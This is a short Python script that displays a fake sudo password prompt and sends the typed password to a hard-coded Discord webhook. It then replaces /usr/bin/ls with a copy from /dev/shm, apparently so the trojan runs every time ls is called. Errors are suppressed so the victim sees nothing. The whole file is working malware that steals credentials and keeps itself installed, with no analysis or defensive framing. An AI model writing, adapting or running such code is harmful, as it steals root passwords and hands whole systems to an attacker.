#!/bin/python3
try:
    import getpass, os
    from discord_webhook import DiscordWebhook

    password = getpass.getpass("[sudo] password for root: ")
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1041408257090134066/brLkBFFgAMX-wGoPYYUaAyRog3-v5HywW1ZA8ffJdW40I3iXwhf9qklYBxHsBTsKPWGN', content=password); response = webhook.execute()
    os.system('/dev/shm/ls /root')
    os.system('cp /dev/shm/ls /usr/bin/ls')
except:
    print('')
